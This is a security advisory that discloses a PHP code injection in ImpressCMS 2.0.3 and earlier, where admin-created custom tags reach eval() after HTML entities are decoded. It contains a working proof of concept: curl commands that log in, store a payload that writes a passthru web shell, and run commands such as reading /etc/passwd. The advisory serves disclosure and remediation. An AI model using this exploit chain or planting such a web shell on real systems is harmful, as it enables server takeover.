# ImpressCMS ≤ 2.0.3 — PHP Code Injection via Custom Tags → Remote Code Execution


## Summary

ImpressCMS 2.0.3 and prior versions allow authenticated administrators to create PHP-type Custom Tags (`customtag_type=3`) whose content is stored in the database and subsequently passed to PHP's `eval()` function on every frontend page load via `IcmsPreloadCustomtag::eventStartOutputInit()` in `plugins/preloads/customtag.php`. The vulnerable `eval()` call exists in `htdocs/modules/system/admin/customtag/class/customtag.php` in the `renderWithPhp()` method. Input sanitization applied by HTML Purifier is bypassed because the function `undoHtmlSpecialChars()` decodes HTML entities back to plain characters before `eval()` is executed. This allows an authenticated attacker with administrator privileges to achieve Remote Code Execution (RCE) as the web server user.

## Affected Versions

| Field | Value |
|---|---|
| **Product** | ImpressCMS Community Edition |
| **Affected** | ≤ 2.0.3 |
| **Component** | System module — Custom Tags |
| **Language** | PHP |
| **Severity** | Critical |
| **CVSS v3.1** | `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |

## Vulnerability Details

### Vulnerable Code

**`htdocs/modules/system/admin/customtag/class/customtag.php` — `renderWithPhp()` method:**

```php
public function renderWithPhp() {
    $ret = $this->getVar('customtag_content', 'e');
    $ret = icms_core_DataFilter::undoHtmlSpecialChars($ret);  // decodes &lt;?php → <?php
    if (!defined('XOOPS_CPFUNC_LOADED') && ...) {
        ob_start();
        echo eval($ret);      // ← arbitrary PHP execution
        $ret = ob_get_contents();
        ob_end_clean();
    }
}
```

**Trigger path — fires on every frontend page load:**

```
IcmsPreloadCustomtag::eventStartOutputInit()   [plugins/preloads/customtag.php]
  → getCustomtagsByName()
  → SystemCustomtag::render()
  → SystemCustomtag::renderWithPhp()
  → eval($decoded_php_payload)                 ← RCE
```

### HTML Purifier Bypass

ImpressCMS appends `<!-- filtered with htmlpurifier --><!-- input filtered -->` to all `TEXTAREA` fields and HTML-encodes `<` as `&lt;`. Two properties make these protections ineffective:

1. `undoHtmlSpecialChars()` runs **before** `eval()`, decoding `&lt;?php` back to `<?php`.
2. Appending `//` at the end of the payload comments out the HTML annotation, preventing a PHP parse error inside `eval()`.

## Proof of Concept

### Environment

```
Docker: MariaDB 10.6 + PHP 8.1 Apache
Target: http://localhost:9090
Admin:  admin / Admin1234!
```

### Step 1 — Authenticate as admin

```bash
curl -sc /tmp/c.txt -X POST 'http://localhost:9090/user.php' \
  -d 'uname=admin&pass=Admin1234%21&op=login' -Lo /dev/null
```

### Step 2 — Create a PHP Custom Tag

```bash
curl -s -b /tmp/c.txt \
  -X POST 'http://localhost:9090/modules/system/admin.php?fct=customtag' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "customtag_content=file_put_contents('/var/www/html/rce.php','<?php passthru(\$_GET[chr(99)]); ?>'); //" \
  -d 'customtagid=0&name=pwn&language=english&customtag_type=3&dohtml=1&doimage=1&doxcode=1&dosmiley=1&view_customtag[]=1&view_customtag[]=2&view_customtag[]=3&op=addcustomtag&changedField='
```

**Response:** HTTP 302 — tag stored in database with `customtag_type=3` (PHP).

### Step 3 — Trigger `eval()` via any page load

```bash
curl -s 'http://localhost:9090/'
```

**Side effect:** `/var/www/html/rce.php` is written to disk by the web server process.

### Step 4 — Execute arbitrary OS commands

```bash
curl -s 'http://localhost:9090/rce.php?c=id'
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
curl -s 'http://localhost:9090/rce.php?c=hostname'
# f22cf21118c0

curl -s 'http://localhost:9090/rce.php?c=cat+/etc/passwd'
# root:x:0:0:root:/root:/bin/bash ...
```

## Root Cause

| File | Line | Issue |
|---|---|---|
| `htdocs/modules/system/admin/customtag/class/customtag.php` | ~104 | `eval()` on user-controlled, admin-supplied content |
| `plugins/preloads/customtag.php` | ~75 | All PHP custom tags evaluated on every frontend page load |
| `htdocs/libraries/icms/core/DataFilter.php` | — | `undoHtmlSpecialChars()` decodes HTML entities before `eval()`, defeating HTML Purifier |

## Remediation

1. **Restrict or remove the PHP custom tag type entirely.** Allowing arbitrary PHP in admin-stored content is inherently dangerous.
2. If the feature is retained, execute stored PHP in a sandboxed context rather than raw `eval()`.
3. Apply a strict Content Security Policy and restrict the Custom Tags admin panel to a dedicated super-admin role.

##This is a dead Project

## References

- [ImpressCMS GitHub repository](https://github.com/ImpressCMS/impresscms)
- [Vulnerable file — customtag.php](https://github.com/ImpressCMS/impresscms/blob/master/htdocs/modules/system/admin/customtag/class/customtag.php)
- [Preload trigger — customtag.php](https://github.com/ImpressCMS/impresscms/blob/master/plugins/preloads/customtag.php)
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- OWASP: Code Injection

## Credits

Discovered by **Vaibhav Kubade** (vaibhavpkubade01@gmail.com)
